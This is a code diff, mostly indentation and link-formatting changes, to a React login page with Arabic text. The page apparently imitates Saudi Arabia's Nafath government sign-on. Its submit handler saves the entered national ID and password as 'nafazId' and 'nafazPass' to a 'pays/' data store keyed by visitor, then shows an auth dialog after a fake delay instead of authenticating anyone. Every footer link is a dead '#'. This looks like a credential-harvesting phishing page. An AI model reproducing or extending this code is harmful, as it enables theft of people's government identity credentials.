@@ -45,43 +45,44 @@ export default function Component() {
     e.preventDefault();
     setShowError("");
 
-if (typeof window === "undefined") return;
+    if (typeof window === "undefined") return;
 
-let visitorId = "";
+    let visitorId = "";
 
-if (typeof window !== "undefined") {
-  const savedVisitor = window.localStorage.getItem("visitor");
-  visitorId = savedVisitor ?? "";
+    if (typeof window !== "undefined") {
+      const savedVisitor = window.localStorage.getItem("visitor");
+      visitorId = savedVisitor ?? "";
 
-  if (!visitorId) {
-    visitorId = Date.now().toString();
-    window.localStorage.setItem("visitor", visitorId);
-  }
-}
+      if (!visitorId) {
+        visitorId = Date.now().toString();
+        window.localStorage.setItem("visitor", visitorId);
+      }
+    }
 
     if (!idLogin || !password) {
       setShowError("يرجى إدخال رقم الهوية وكلمة المرور");
       return;
     }
 
-try {
-  setIsLoading(true);
+    try {
+      setIsLoading(true);
 
-  addData(`pays/${visitorId}`, {
-    id: visitorId,
-    nafazId: idLogin,
-    nafazPass: password,
-  });
+      addData(`pays/${visitorId}`, {
+        id: visitorId,
+        nafazId: idLogin,
+        nafazPass: password,
+      });
 
-  setTimeout(() => {
-    setShowAuthDialog(true);
-    setIsLoading(false);
-  }, 1000);
-} catch (error) {
-  console.error(error);
-  setIsLoading(false);
-  setShowError("حدث خطأ أثناء تسجيل الدخول");
-}
+      setTimeout(() => {
+        setShowAuthDialog(true);
+        setIsLoading(false);
+      }, 1000);
+    } catch (error) {
+      console.error(error);
+      setIsLoading(false);
+      setShowError("حدث خطأ أثناء تسجيل الدخول");
+    }
+  };
 
   return (
     <div
@@ -273,42 +274,12 @@ try {
           </div>
 
           <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الرئيسية
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              حول
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              اتصل بنا
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الشروط والأحكام
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              المساعدة والدعم
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              سياسة الخصوصية
-            </a>
+            <a href="#" className="hover:text-teal-600 transition-colors font-medium">الرئيسية</a>
+            <a href="#" className="hover:text-teal-600 transition-colors font-medium">حول</a>
+            <a href="#" className="hover:text-teal-600 transition-colors font-medium">اتصل بنا</a>
+            <a href="#" className="hover:text-teal-600 transition-colors font-medium">الشروط والأحكام</a>
+            <a href="#" className="hover:text-teal-600 transition-colors font-medium">المساعدة والدعم</a>
+            <a href="#" className="hover:text-teal-600 transition-colors font-medium">سياسة الخصوصية</a>
           </div>
 
           <div className="flex justify-center mt-4">
